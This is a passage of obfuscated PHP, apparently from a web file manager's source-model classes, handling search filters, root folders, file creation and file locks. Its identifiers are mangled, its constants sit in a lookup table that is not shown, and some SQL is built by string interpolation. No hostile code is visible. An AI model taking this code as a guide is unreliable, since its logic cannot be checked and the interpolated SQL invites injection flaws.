$_SERVER[•€áå–Õ]; $ÌäµÇ« = $Œ¯è’ËÖ[$å˜ğ¢üÒ[464]] == $å˜ğ¢üÒ[100]; if (!strstr($Œ¯è’ËÖ[$å˜ğ¢üÒ[564]], $å˜ğ¢üÒ[60] . $à¹Àå±[$å˜ğ¢üÒ[192]] . $å˜ğ¢üÒ[60])) { return !1; } if (isset($à¹Àå±[$å˜ğ¢üÒ[465]]) && $à¹Àå±[$å˜ğ¢üÒ[465]] != $å˜ğ¢üÒ[1946]) { if ($à¹Àå±[$å˜ğ¢üÒ[465]] == $å˜ğ¢üÒ[87] && !$ÌäµÇ«) { return !1; } if ($à¹Àå±[$å˜ğ¢üÒ[465]] != $å˜ğ¢üÒ[87] && $ÌäµÇ«) { return !1; } if (!strstr($Œ¯è’ËÖ[$å˜ğ¢üÒ[187]], $å˜ğ¢üÒ[60] . $à¹Àå±[$å˜ğ¢üÒ[465]] . $å˜ğ¢üÒ[60])) { return !1; } } if (isset($à¹Àå±[$å˜ğ¢üÒ[2154]]) && $à¹Àå±[$å˜ğ¢üÒ[2154]] < $Œ¯è’ËÖ[$å˜ğ¢üÒ[88]]) { return !1; } if (isset($à¹Àå±[$å˜ğ¢üÒ[2155]]) && $à¹Àå±[$å˜ğ¢üÒ[2155]] > $Œ¯è’ËÖ[$å˜ğ¢üÒ[88]]) { return !1; } if (isset($à¹Àå±[$å˜ğ¢üÒ[641]]) && $à¹Àå±[$å˜ğ¢üÒ[641]] != $Œ¯è’ËÖ[$å˜ğ¢üÒ[508]]) { return !1; } return !0; } public function listSearchChildren($Ä·…íÃ, $ôÓ‘Ö®â = 5000) { $°®õøŸ¯ =& $_SERVER[•€áå–Õ]; $ƒçæ‹ëá = array(); $¿·»¾‘´ = $this->sourceInfo($Ä·…íÃ); $©‰¥¾€Ñ = array($°®õøŸ¯[564] => array($°®õøŸ¯[438], $¿·»¾‘´[$°®õøŸ¯[564]] . $¿·»¾‘´[$°®õøŸ¯[193]] . $°®õøŸ¯[592])); $ŒßïÛ¯ = $this->field($°®õøŸ¯[88])->where($©‰¥¾€Ñ)->limit($ôÓ‘Ö®â + 1)->select(); $¶¢ÌƒŸİ = is_array($ŒßïÛ¯) ? count($ŒßïÛ¯) : 0; if ($¶¢ÌƒŸİ > $ôÓ‘Ö®â) { return $this->_listSearchChildrenNear($Ä·…íÃ, $ôÓ‘Ö®â); } $²¤ì¿òŞ = $this->field($°®õøŸ¯[193])->where($©‰¥¾€Ñ)->select(); $ƒçæ‹ëá = array_to_keyvalue($²¤ì¿òŞ, $°®õøŸ¯[22], $°®õøŸ¯[193]); return $ƒçæ‹ëá; } private function _listSearchChildrenNear($Ã°Çöğı, $š°¸÷éœ) { $˜Ó´¦ÀÀ =& $_SERVER[•€áå–Õ]; $¿˜à„Ö¸ = array(); $×ï×û = array($˜Ó´¦ÀÀ[192] => $Ã°Çöğı); $ššÜôî = $this->field($˜Ó´¦ÀÀ[2156])->where($×ï×û)->select(); $Ğ¼¦î¦‘ = array_to_keyvalue(array_filter_by_field($ššÜôî, $˜Ó´¦ÀÀ[464], $˜Ó´¦ÀÀ[100]), $˜Ó´¦ÀÀ[22], $˜Ó´¦ÀÀ[193]); $¿˜à„Ö¸ = array_merge($¿˜à„Ö¸, array_to_keyvalue($ššÜôî, $˜Ó´¦ÀÀ[22], $˜Ó´¦ÀÀ[193])); if (!$Ğ¼¦î¦‘) { return $¿˜à„Ö¸; } $×ï×û = array($˜Ó´¦ÀÀ[192] => array($˜Ó´¦ÀÀ[17], $Ğ¼¦î¦‘)); $ššÜôî = $this->field($˜Ó´¦ÀÀ[2156])->where($×ï×û)->limit($š°¸÷éœ)->select(); $¿˜à„Ö¸ = array_merge($¿˜à„Ö¸, array_to_keyvalue($ššÜôî, $˜Ó´¦ÀÀ[22], $˜Ó´¦ÀÀ[193])); $¿˜à„Ö¸ = array_slice($¿˜à„Ö¸, 0, intval($š°¸÷éœ)); return $¿˜à„Ö¸; } private function _listSearchBindPinyin($¦®ñÎª¾, &$ÉæÙø¾, &$€Ã¤Œğ¼) { $ÖÕåŞ©’ =& $_SERVER[•€áå–Õ]; if (!isset($¦®ñÎª¾[$ÖÕåŞ©’[1985]]) || !$¦®ñÎª¾[$ÖÕåŞ©’[1985]]) { return; } if (!Input::check($¦®ñÎª¾[$ÖÕåŞ©’[1985]], $ÖÕåŞ©’[373]) || strlen($¦®ñÎª¾[$ÖÕåŞ©’[1985]]) < 2) { return; } $´ ø‚ëË = "\114\x45\x46\x54\x20\112\117\111\x4e\x20{$this->tablePrefix}\x69\x6f\x5f\163\157\x75\x72\x63\x65\137\x6d\145\x74\141\40\155\x65\x74\141\40\x6f\x6e\x20\163\x6f\165\x72\143\x65\x2e\x73\157\165\162\x63\145\x49\x44\40\x3d\x20\155\x65\164\x61\56\163\157\x75\x72\x63\x65\111\104"; $åÑà®÷š = array(); $€Ã¤Œğ¼ = str_replace(array($ÖÕåŞ©’[12], $ÖÕåŞ©’[63], $ÖÕåŞ©’[2157]), $ÖÕåŞ©’[22], $€Ã¤Œğ¼); $€Ã¤Œğ¼ = $ÖÕåŞ©’[490] . str_replace($ÖÕåŞ©’[60], $ÖÕåŞ©’[491], $€Ã¤Œğ¼); $À³ƒÜÃŞ = $ÉæÙø¾[$ÖÕåŞ©’[42]]; unset($ÉæÙø¾[$ÖÕåŞ©’[42]]); foreach ($ÉæÙø¾ as $–ıÈø¹¹ => $•ÌÙñ²) { $åÑà®÷š[$ÖÕåŞ©’[490] . $–ıÈø¹¹] = $•ÌÙñ²; } foreach ($À³ƒÜÃŞ as $ÒÔà¶ö) { $åÑà®÷š[] = array($ÖÕåŞ©’[495] => $ÒÔà¶ö, $ÖÕåŞ©’[1041] => $ÖÕåŞ©’[1989], array($ÖÕåŞ©’[2158] => $ÒÔà¶ö, $ÖÕåŞ©’[2159] => array($ÖÕåŞ©’[17], array($ÖÕåŞ©’[517], $ÖÕåŞ©’[516])))); } $this->join($´ ø‚ëË); $ÉæÙø¾ = $åÑà®÷š; } private function _parseSearchWhere($Ş«Âçì©) { $Î¡ÄŸû½ =& $_SERVER[•€áå–Õ]; $ÛêñâÚÔ = array(); if (isset($Ş«Âçì©[$Î¡ÄŸû½[801]]) && $Ş«Âçì©[$Î¡ÄŸû½[801]]) { $ÛêñâÚÔ[$Î¡ÄŸû½[97]] = array($Î¡ÄŸû½[2160], $Ş«Âçì©[$Î¡ÄŸû½[801]]); } if (isset($Ş«Âçì©[$Î¡ÄŸû½[802]]) && $Ş«Âçì©[$Î¡ÄŸû½[802]]) { $ŒÛß„ç = array($Î¡ÄŸû½[2161], $Ş«Âçì©[$Î¡ÄŸû½[802]]); if ($ÛêñâÚÔ[$Î¡ÄŸû½[97]]) { $ÛêñâÚÔ[$Î¡ÄŸû½[97]] = array($ÛêñâÚÔ[$Î¡ÄŸû½[97]], $ŒÛß„ç, $Î¡ÄŸû½[2162]); } else { $ÛêñâÚÔ[$Î¡ÄŸû½[97]] = $ŒÛß„ç; } } if (isset($Ş«Âçì©[$Î¡ÄŸû½[2154]]) && $Ş«Âçì©[$Î¡ÄŸû½[2154]] > 0) { $ÛêñâÚÔ[$Î¡ÄŸû½[88]] = array($Î¡ÄŸû½[2160], $Ş«Âçì©[$Î¡ÄŸû½[2154]]); } if (isset($Ş«Âçì©[$Î¡ÄŸû½[2155]]) && $Ş«Âçì©[$Î¡ÄŸû½[2155]]) { $ŒÛß„ç = array($Î¡ÄŸû½[2161], $Ş«Âçì©[$Î¡ÄŸû½[2155]]); if ($ÛêñâÚÔ[$Î¡ÄŸû½[88]]) { $ÛêñâÚÔ[$Î¡ÄŸû½[88]] = array($ÛêñâÚÔ[$Î¡ÄŸû½[88]], $ŒÛß„ç, $Î¡ÄŸû½[2162]); } else { $ÛêñâÚÔ[$Î¡ÄŸû½[88]] = $ŒÛß„ç; } } if (isset($Ş«Âçì©[$Î¡ÄŸû½[641]]) && $Ş«Âçì©[$Î¡ÄŸû½[641]]) { $ÛêñâÚÔ[] = array($Î¡ÄŸû½[508] => $Ş«Âçì©[$Î¡ÄŸû½[641]], $Î¡ÄŸû½[506] => $Ş«Âçì©[$Î¡ÄŸû½[641]], $Î¡ÄŸû½[1041] => $Î¡ÄŸû½[1989]); } if (isset($Ş«Âçì©[$Î¡ÄŸû½[465]]) && $Ş«Âçì©[$Î¡ÄŸû½[465]]) { $Æ€”ÒŠ® = $Ş«Âçì©[$Î¡ÄŸû½[465]]; if ($Æ€”ÒŠ® == $Î¡ÄŸû½[87]) { $ÛêñâÚÔ[$Î¡ÄŸû½[464]] = 1; } else { if ($Æ€”ÒŠ® == $Î¡ÄŸû½[2163]) { $ÛêñâÚÔ[$Î¡ÄŸû½[464]] = 0; } else { if ($Æ€”ÒŠ®) { $Æ€”ÒŠ® = is_array($Æ€”ÒŠ®) ? $Æ€”ÒŠ® : explode($Î¡ÄŸû½[60], $Æ€”ÒŠ®); $ÛêñâÚÔ[$Î¡ÄŸû½[465]] = array($Î¡ÄŸû½[471], $Æ€”ÒŠ®); $ÛêñâÚÔ[$Î¡ÄŸû½[464]] = 0; } } } } $this->_parseSearchParent($Ş«Âçì©, $ÛêñâÚÔ); if (isset($Ş«Âçì©[$Î¡ÄŸû½[1985]]) && trim($Ş«Âçì©[$Î¡ÄŸû½[1985]])) { $è’¸Ò— = trim($Ş«Âçì©[$Î¡ÄŸû½[1985]]); $¯£Ö„Å = explode($Î¡ÄŸû½[63], $è’¸Ò—); if (strlen($è’¸Ò—) > 2 && (substr($è’¸Ò—, 0, 1) == $Î¡ÄŸû½[130] && substr($è’¸Ò—, -1) == $Î¡ÄŸû½[130]) || substr($è’¸Ò—, 0, 1) == $Î¡ÄŸû½[68] && substr($è’¸Ò—, -1) == $Î¡ÄŸû½[68]) { $è’¸Ò— = substr($è’¸Ò—, 1, -1); $¯£Ö„Å = array($è’¸Ò—); } $ÛêñâÚÔ[$Î¡ÄŸû½[42]] = array(array($Î¡ÄŸû½[591], $Î¡ÄŸû½[1987] . $è’¸Ò— . $Î¡ÄŸû½[1987])); if (count($¯£Ö„Å) > 1) { $ÛêñâÚÔ[$Î¡ÄŸû½[42]] = array(); foreach ($¯£Ö„Å as $ÓåÏèÃ) { if (!trim($ÓåÏèÃ)) { continue; } $ÛêñâÚÔ[$Î¡ÄŸû½[42]][] = array($Î¡ÄŸû½[591], $Î¡ÄŸû½[1987] . trim($ÓåÏèÃ) . $Î¡ÄŸû½[1987]); } } } return $ÛêñâÚÔ; } private function _parseSearchParent($Ğúõß”Ò, &$±Ù“ºêÁ) { $Ä¸²š å =& $_SERVER[•€áå–Õ]; if (!isset($Ğúõß”Ò[$Ä¸²š å[192]]) || !$Ğúõß”Ò[$Ä¸²š å[192]]) { return; } $…ÎÇÑŞÒ = $this->pathInfo($Ğúõß”Ò[$Ä¸²š å[192]]); $¤¸ù— = $…ÎÇÑŞÒ[$Ä¸²š å[192]] . $Ä¸²š å[22] === $Ä¸²š å[224]; $“áƒ‚¸ = $…ÎÇÑŞÒ[$Ä¸²š å[190]] == $Ä¸²š å[558]; if ($…ÎÇÑŞÒ[$Ä¸²š å[575]] == $Ä¸²š å[576]) { $ŞÜåõÈ = $this->sourceInfo($Ğúõß”Ò[$Ä¸²š å[192]]); $…ÎÇÑŞÒ[$Ä¸²š å[564]] = $ŞÜåõÈ[$Ä¸²š å[564]]; } $±Ù“ºêÁ[$Ä¸²š å[631]] = array($Ä¸²š å[591], $…ÎÇÑŞÒ[$Ä¸²š å[564]] . $Ğúõß”Ò[$Ä¸²š å[192]] . $Ä¸²š å[592]); $²Êúëşî = isset($Ğúõß”Ò[$Ä¸²š å[1850]]) && in_array($Ä¸²š å[558], $Ğúõß”Ò[$Ä¸²š å[1850]]); if (!$²Êúëşî || !$“áƒ‚¸ || !$¤¸ù— || !$…ÎÇÑŞÒ[$Ä¸²š å[466]]) { return; } if (!AuthModel::authCheckRoot($…ÎÇÑŞÒ[$Ä¸²š å[466]][$Ä¸²š å[467]])) { return; } $ôòôˆ¨ = $…ÎÇÑŞÒ[$Ä¸²š å[549]] . $Ä¸²š å[22]; if ($ôòôˆ¨ == $Ä¸²š å[100]) { unset($±Ù“ºêÁ[$Ä¸²š å[631]]); $±Ù“ºêÁ[$Ä¸²š å[190]] = self::TYPE_GROUP; return; } $»â•ö = Model($Ä¸²š å[565])->groupChildrenAll($ôòôˆ¨); $‘üôºÊ = count($»â•ö); if ($‘üôºÊ <= 1) { return; } $œ´¢şÒÇ = array($Ä¸²š å[192] => 0, $Ä¸²š å[190] => self::TYPE_GROUP, $Ä¸²š å[549] => array($Ä¸²š å[17], $»â•ö)); $„â²İÖÔ = $this->field($Ä¸²š å[2164])->where($œ´¢şÒÇ)->limit($‘üôºÊ)->select(); $±Ù“ºêÁ[$Ä¸²š å[631]] = array(); foreach ($„â²İÖÔ as $°óå•ïù) { $±Ù“ºêÁ[$Ä¸²š å[631]][] = array($Ä¸²š å[591], $Ä¸²š å[574] . $°óå•ïù[$Ä¸²š å[193]] . $Ä¸²š å[592]); } $±Ù“ºêÁ[$Ä¸²š å[631]][] = $Ä¸²š å[1989]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($çÔËİ¿ª) { $ÀØÆİ•‰ =& $_SERVER[•€áå–Õ]; $¿ûŞ ’¨ = Model($ÀØÆİ•‰[557])->where(array($ÀØÆİ•‰[1684] => $çÔËİ¿ª))->find(); $é‹–‘ê = $this->_mkdirRoot(SourceModel::TYPE_USER, $çÔËİ¿ª, $¿ûŞ ’¨[$ÀØÆİ•‰[42]]); $this->userDesktopAdd($é‹–‘ê); return $é‹–‘ê; } public function userDesktopAdd($îÜøäñ³) { $¶á–¡Ç• =& $_SERVER[•€áå–Õ]; $‰ôéˆ¤² = LNG($¶á–¡Ç•[2165]); $´ëìšÅØ = $this->mkdir($îÜøäñ³, $‰ôéˆ¤²); $this->metaSet($´ëìšÅØ, $¶á–¡Ç•[2166], $¶á–¡Ç•[100]); $this->metaSet($îÜøäñ³, $¶á–¡Ç•[2167], $´ëìšÅØ); } public function userPathSafeAdd($£÷Ğ’·ß) { $‘ÄÓÎÒ• =& $_SERVER[•€áå–Õ]; $ÇÖÒÑ‡´ = Model($‘ÄÓÎÒ•[557])->getInfoFull($£÷Ğ’·ß); if (!$ÇÖÒÑ‡´) { return !1; } if (_get($ÇÖÒÑ‡´, $‘ÄÓÎÒ•[579])) { return $ÇÖÒÑ‡´[$‘ÄÓÎÒ•[518]][$‘ÄÓÎÒ•[2168]]; } $êò©Ôö = $this->_mkdirRoot(SourceModel::TYPE_USER, $£÷Ğ’·ß, $‘ÄÓÎÒ•[2169], $‘ÄÓÎÒ•[485]); Model($‘ÄÓÎÒ•[557])->metaSet($£÷Ğ’·ß, $‘ÄÓÎÒ•[2168], $êò©Ôö); $this->metaSet($êò©Ôö, $‘ÄÓÎÒ•[2170], $£÷Ğ’·ß); return $êò©Ôö; } public function groupRootAdd($º‰®é¼™) { $çíï¨¡¾ =& $_SERVER[•€áå–Õ]; $¡ÉéŠöŒ = Model($çíï¨¡¾[565])->where(array($çíï¨¡¾[1979] => $º‰®é¼™))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $º‰®é¼™, $¡ÉéŠöŒ[$çíï¨¡¾[42]]); } public function systemRootPathAdd($ùËû‰Ç¡) { if ($ùËû‰Ç¡ != $_SERVER[•€áå–Õ][585]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ùËû‰Ç¡); } public function userRootRemove($ÃÑ†êŒ) { $ÔıÌ¸Ğ = $this->targetSourceRoot(SourceModel::TYPE_USER, $ÃÑ†êŒ, !0); foreach ($ÔıÌ¸Ğ as $“ØÖÍá) { if (!$“ØÖÍá) { continue; } $this->remove($“ØÖÍá[$_SERVER[•€áå–Õ][193]], !1); } } public function groupRootRemove($©Ù¬Ä¶Ò) { $‘µƒ› = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $©Ù¬Ä¶Ò); if (!$‘µƒ›) { return; } $this->remove($‘µƒ›[$_SERVER[•€áå–Õ][193]], !1); } private function _mkdirRoot($Ù¿¨ê‚‚, $åï‘œ¡ú, $‹ó«¦Ğœ, $Ø“ƒÅ¦ = '') { $ŒœÚªş‰ =& $_SERVER[•€áå–Õ]; $¶õµîÙ¯ = defined($ŒœÚªş‰[2113]) ? USER_ID : 0; $Í†è²” = array($ŒœÚªş‰[456] => 0, $ŒœÚªş‰[627] => $Ù¿¨ê‚‚, $ŒœÚªş‰[628] => $åï‘œ¡ú, $ŒœÚªş‰[625] => 1, $ŒœÚªş‰[629] => $¶õµîÙ¯, $ŒœÚªş‰[630] => $¶õµîÙ¯, $ŒœÚªş‰[626] => $Ø“ƒÅ¦, $ŒœÚªş‰[631] => $ŒœÚªş‰[574], $ŒœÚªş‰[483] => 0, $ŒœÚªş‰[596] => 0, $ŒœÚªş‰[521] => 0, $ŒœÚªş‰[632] => $ŒœÚªş‰[22]); if ($Ü¥ÁÀ§ = $this->where($Í†è²”)->find()) { return $Ü¥ÁÀ§[$ŒœÚªş‰[193]]; } $”Ôê¸ºÕ = "\x4d\x6f\x64\x65\x6c\x53\157\165\162\143\145\x2e\155\x6b\144\151\162\x52\157\157\164\x2e{$Ù¿¨ê‚‚}\x2e{$åï‘œ¡ú}\x2e" . $‹ó«¦Ğœ; CacheLock::lock($”Ôê¸ºÕ); $Í†è²”[$ŒœÚªş‰[42]] = $‹ó«¦Ğœ; $Åëœ€«Ø = $this->add($Í†è²”); $·úÜ–­ = array($ŒœÚªş‰[633] => short_id($Åëœ€«Ø)); $this->where(array($ŒœÚªş‰[470] => $Åëœ€«Ø))->save($·úÜ–­); CacheLock::unlock($”Ôê¸ºÕ); return $Åëœ€«Ø; } private function targetSourceRoot($Ûï·ÏØ», $¥ºÅÃ››, $‡ÄŞ’„ı = false) { $¥˜Ú¶ =& $_SERVER[•€áå–Õ]; $ù€¼‹–– = array($¥˜Ú¶[456] => 0, $¥˜Ú¶[627] => $Ûï·ÏØ», $¥˜Ú¶[628] => $¥ºÅÃ››); if ($‡ÄŞ’„ı) { $ÙÇ°ø = $this->where($ù€¼‹––)->select(); return $ÙÇ°ø ? $ÙÇ°ø : array(); } $Œ¬®ŸÖä = $this->where($ù€¼‹––)->find(); return $Œ¬®ŸÖä ? $Œ¬®ŸÖä : array(); } public function sourceRootGroup($‰¹®”Ÿî) { $Ñ‘¼¼şÍ =& $_SERVER[•€áå–Õ]; if (is_string($‰¹®”Ÿî)) { $‰¹®”Ÿî = array($‰¹®”Ÿî); } $àÔÌ’í— = $this->listSourceRoot(SourceModel::TYPE_GROUP, $‰¹®”Ÿî, $Ñ‘¼¼şÍ[215]); $‡ş»›®· = array($Ñ‘¼¼şÍ[424] => $àÔÌ’í—, $Ñ‘¼¼şÍ[421] => array($Ñ‘¼¼şÍ[799] => count($‰¹®”Ÿî))); $this->_listDataApply($‡ş»›®·[$Ñ‘¼¼şÍ[424]]); $this->_listMake($‡ş»›®·); return array_to_keyvalue($‡ş»›®·[$Ñ‘¼¼şÍ[94]], $Ñ‘¼¼şÍ[549]); } public function mkfile($“ÒüÄ¤«, $„³å§°·, $¤²ì°Æ— = '', $§Ù–ûĞ¢ = REPEAT_RENAME) { $Îš° =& $_SERVER[•€áå–Õ]; $­µ•ÏÛš = Model($Îš°[653])->addFileByContent($¤²ì°Æ—, $„³å§°·); return $this->_createFileCall($“ÒüÄ¤«, $„³å§°·, $­µ•ÏÛš, $§Ù–ûĞ¢, $Îš°[1384]); } public function addFile($Û¼æ¬Ã¶, $Ï´˜£§“, $Ï•¢Î¦•, $‹…î»ã¨ = false, $©¼Ò‘ş  = REPEAT_RENAME) { $­æ”´ÍØ = Model($_SERVER[•€áå–Õ][653])->addFile($Ï´˜£§“, $Ï•¢Î¦•, $‹…î»ã¨); return $this->_createFileCall($Û¼æ¬Ã¶, $Ï•¢Î¦•, $­æ”´ÍØ, $©¼Ò‘ş ); } public function addFileByFileID($ÄßâÀÙ‚, $”Ö‚í‰, $¢›´åŒ‡, $¶ßÕæİ¡ = REPEAT_RENAME) { $üÃŞ¥Õ =& $_SERVER[•€áå–Õ]; $½ôò¢ƒ¹ = Model($üÃŞ¥Õ[653])->find($”Ö‚í‰); Model($üÃŞ¥Õ[653])->linkAdd($”Ö‚í‰); return $this->_createFileCall($ÄßâÀÙ‚, $¢›´åŒ‡, $½ôò¢ƒ¹, $¶ßÕæİ¡); } public function addFileByRemote($½¹±°éö, $¸ĞÚĞûû, $Ü£ï§», $å†ûŞçş = array(), $úÄòÂ¬ = REPEAT_RENAME) { $Ó‚‹•¯û = Model($_SERVER[•€áå–Õ][653])->addFileByRemote($¸ĞÚĞûû, $Ü£ï§», $å†ûŞçş); return $this->_createFileCall($½¹±°éö, $Ü£ï§», $Ó‚‹•¯û, $úÄòÂ¬); } private function _createFileCall($†Ú¯Î‰¥, $€¿Ù«Ê, $àŸ¤Üœ€, $ÜŞš¯Ú™, $ëĞ­²ÃÏ = "\165\160\x6c\157\x61\144") { $á€èÛï• =& $_SERVER[•€áå–Õ]; $¬ÇêøÁä = !1; $this->setMasterDB(); $this->lockWriteStart($†Ú¯Î‰¥, $€¿Ù«Ê); $ş¼ğÄİ® = $this->fileNameExist($†Ú¯Î‰¥, $€¿Ù«Ê); $®íı°„ = $this->_createFile($†Ú¯Î‰¥, $€¿Ù«Ê, $àŸ¤Üœ€, $ÜŞš¯Ú™, $¬ÇêøÁä); if (!$¬ÇêøÁä) { Model($á€èÛï•[523])->remove($àŸ¤Üœ€[$á€èÛï•[520]]); } if ($¬ÇêøÁä && $®íı°„ && $®íı°„ != $ş¼ğÄİ®) { Model($á€èÛï•[2138])->eventCreate($®íı°„, $ëĞ­²ÃÏ); } $this->lockWriteEnd($†Ú¯Î‰¥, $€¿Ù«Ê); return $®íı°„; } public function mkdir($û›Û×Šç, $Ë¶¹§ª¼, $°¿ÇÂƒÁ = REPEAT_SKIP) { $ºãÛøî =& $_SERVER[•€áå–Õ]; $this->setMasterDB(); $Å¾ëƒÚ = $this->sourceInfo($û›Û×Šç); if (!$Å¾ëƒÚ) { return !1; } $this->lockWriteStart($û›Û×Šç, $Ë¶¹§ª¼); if ($°¿ÇÂƒÁ !== !1) { $‘„©èÄà = $this->fileNameExist($û›Û×Šç, $Ë¶¹§ª¼); if ($‘„©èÄà && $°¿ÇÂƒÁ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($û›Û×Šç, $Ë¶¹§ª¼); return $‘„©èÄà; } $Ë¶¹§ª¼ = $this->fileNameAuto($û›Û×Šç, $Ë¶¹§ª¼, $°¿ÇÂƒÁ); } $ëšÊ‚³õ = array($ºãÛøî[625] => 1, $ºãÛøî[473] => $Ë¶¹§ª¼, $ºãÛøî[626] => $ºãÛøî[22], $ºãÛøî[521] => 0, $ºãÛøî[596] => 0); $èÚı°ŠÇ = $this->_addSource($ëšÊ‚³õ, $Å¾ëƒÚ); Model($ºãÛøî[2138])->eventCreate($èÚı°ŠÇ, $ºãÛøî[1385]); $this->lockWriteEnd($û›Û×Šç, $Ë¶¹§ª¼); return $èÚı°ŠÇ; } public function listSourceRoot($±íŞ×Ï, $ñŒ”å¤’, $š¶á×Œ = "\x73\x6f\165\162\143\x65\111\x44\x2c\164\x61\162\147\x65\x74\x49\x44\54\x73\151\x7a\145") { $«¹»â·Ç =& $_SERVER[•€áå–Õ]; $öÈÙ‰ = $«¹»â·Ç[433]; $İä±¢³ç = array(); $ê­ôü”® = 1024 * 50; $¹‹ÆÓÏè = is_array($¹‹ÆÓÏè) ? $¹‹ÆÓÏè : array(); $®¢ëï³Ó = count($ñŒ”å¤’); $Ç–Éµ›Î = $this->tablePrefix . $«¹»â·Ç[2171]; for ($Õ‡€É÷¡ = 0; $Õ‡€É÷¡ < $®¢ëï³Ó; $Õ‡€É÷¡++) { $‰»¡…ƒ = $ñŒ”å¤’[$Õ‡€É÷¡]; $öÈÙ‰ .= "\123\105\x4c\105\103\124\x20\x2a\40\106\x52\117\115\x20\x28\x53\105\x4c\x45\x43\124\x20{$š¶á×Œ}\x20\106\x52\x4f\x4d\x20\140{$Ç–Éµ›Î}\x60\40\x57\110\105\122\105\40"; $öÈÙ‰ .= "\x60\160\141\162\x65\x6e\x74\x49\x44\x60\x3d\x30\x20\101\116\x44\40\x60\x74\141\x72\147\x65\x74\x49\x44\x60\75{$‰»¡…ƒ}\x20\101\116\x44\40\x60\164\x61\162\147\145\x74\124\171\160\x65\x60\x3d{$±íŞ×Ï}\40\141\156\144\40\146\151\154\145\x54\x79\160\x65\x3d\x27\47\x20\x6c\151\155\151\164\40\x31\51\40\x61\x73\x20\x74\142\137{$Õ‡€É÷¡}\x20\125\116\111\117\116\x20\101\114\x4c\40"; if ((strlen($öÈÙ‰) >= $ê­ôü”® || $Õ‡€É÷¡ == $®¢ëï³Ó - 1) && $öÈÙ‰) { $öÈÙ‰ = substr($öÈÙ‰, 0, -strlen($«¹»â·Ç[1079])); $¢÷€Ë¤Ä = $this->query($öÈÙ‰); $öÈÙ‰ = $«¹»â·Ç[22]; $İä±¢³ç = array_merge($İä±¢³ç, $¢÷€Ë¤Ä); } } return $İä±¢³ç; } private function _createFile($™¡¡†‡…, $Èœ€ò˜Ó, $¤…İ¶ªŞ, $¯üà°†Ò, &$Ö…È²‡) { $ÈæÆÒ¸› =& $_SERVER[•€áå–Õ]; $¾ˆÊÎè‘ = $this->sourceInfo($™¡¡†‡…); if (!$¤…İ¶ªŞ || !$¾ˆÊÎè‘) { return !1; } if ($¯üà°†Ò !== !1) { $±èĞ°Ø· = $this->fileNameExist($™¡¡†‡…, $Èœ€ò˜Ó); } $Ö…È²‡ = !0; if ($¯üà°†Ò && $±èĞ°Ø·) { if ($¯üà°†Ò == REPEAT_SKIP) { $Ö…È²‡ = !1; return $±èĞ°Ø·; } else { if ($¯üà°†Ò == REPEAT_REPLACE) { $ÁÂºóÕ = $this->sourceInfo($±èĞ°Ø·); $§ı„Ã¢¦ = $this->fileHistory($ÁÂºóÕ, $¤…İ¶ªŞ[$ÈæÆÒ¸›[520]], $¤…İ¶ªŞ[$ÈæÆÒ¸›[88]]); if (!$§ı„Ã¢¦) { $Ö…È²‡ = !1; } else { $this->folderSizeReset($™¡¡†‡…); } return $±èĞ°Ø·; } else { $Èœ€ò˜Ó = $this->fileNameAuto($™¡¡†‡…, $Èœ€ò˜Ó, $¯üà°†Ò, !1); } } } $ùÙ»·û¡ = array($ÈæÆÒ¸›[625] => 0, $ÈæÆÒ¸›[473] => $Èœ€ò˜Ó, $ÈæÆÒ¸›[626] => substr(get_path_ext($Èœ€ò˜Ó), 0, 10), $ÈæÆÒ¸›[521] => $¤…İ¶ªŞ[$ÈæÆÒ¸›[520]], $ÈæÆÒ¸›[596] => $¤…İ¶ªŞ[$ÈæÆÒ¸›[88]]); $öÖ£ºÃ = $this->_addSource($ùÙ»·û¡, $¾ˆÊÎè‘); $this->folderSizeReset($™¡¡†‡…, intval($ùÙ»·û¡[$ÈæÆÒ¸›[88]])); return $öÖ£ºÃ; } protected function fileHistory($¡²»ø¦Ù, $ŸÍò‹Ñş, $‡ı¦•Ï) { $Ô°‘¦”• =& $_SERVER[•€áå–Õ]; if ($¡²»ø¦Ù[$Ô°‘¦”•[520]] == $ŸÍò‹Ñş) { return !1; } $this->checkLock($¡²»ø¦Ù[$Ô°‘¦”•[193]], $ŸÍò‹Ñş); Model($Ô°‘¦”•[2172])->addHistory($¡²»ø¦Ù); $£µèÕàü = array($Ô°‘¦”•[630] => USER_ID, $Ô°‘¦”•[477] => time(), $Ô°‘¦”•[520] => $ŸÍò‹Ñş, $Ô°‘¦”•[88] => $‡ı¦•Ï); $this->where(array($Ô°‘¦”•[470] => $¡²»ø¦Ù[$Ô°‘¦”•[193]]))->save($£µèÕàü); $this->sourceCacheClear($¡²»ø¦Ù[$Ô°‘¦”•[193]]); return !0; } public function checkLock($’‘ÆÜÁ¨, $×Ÿ‘•ÀÙ) { $Ò‚÷ÑĞê =& $_SERVER[•€áå–Õ]; $¯¿÷ÍÀ = $this->pathInfo($’‘ÆÜÁ¨); if (!$this->fileIsLock($¯¿÷ÍÀ, !0)) { return; } $…±÷ÄÇô = Session::get($Ò‚÷ÑĞê[2173]); $«¤èµë = substr($¯¿÷ÍÀ[$Ò‚÷ÑĞê[42]], 0, -1 - strlen($¯¿÷ÍÀ[$Ò‚÷ÑĞê[187]])) . $Ò‚÷ÑĞê[1249] . $…±÷ÄÇô . $Ò‚÷ÑĞê[20] . $¯¿÷ÍÀ[$Ò‚÷ÑĞê[187]]; $“è¤ıë² = Model($Ò‚÷ÑĞê[653])->find($×Ÿ‘•ÀÙ); $this->_createFileCall($¯¿÷ÍÀ[$Ò‚÷ÑĞê[192]], $«¤èµë, $“è¤ıë², REPEAT_REPLACE, $Ò‚÷ÑĞê[1384]); $±ûÖíó = $¯¿÷ÍÀ[$Ò‚÷ÑĞê[518]][$Ò‚÷ÑĞê[589]]; $é¨ÆŒêå = $±ûÖíó[$Ò‚÷ÑĞê[2174]] ? $±ûÖíó[$Ò‚÷ÑĞê[2174]] : $±ûÖíó[$Ò‚÷ÑĞê[42]]; show_json(LNG($Ò‚÷ÑĞê[2175]) . $Ò‚÷ÑĞê[2176] . LNG($Ò‚÷ÑĞê[2177]) . $Ò‚÷ÑĞê[2178] . $é¨ÆŒêå . $Ò‚÷ÑĞê[2179], !1); } public function fileIsLock($ñš•òû, $Ñá«ñØÒ = false) { $“¡›Ëš =& $_SERVER[•€áå–Õ]; if (!isset($ñš•òû[$“¡›Ëš[518]]) || 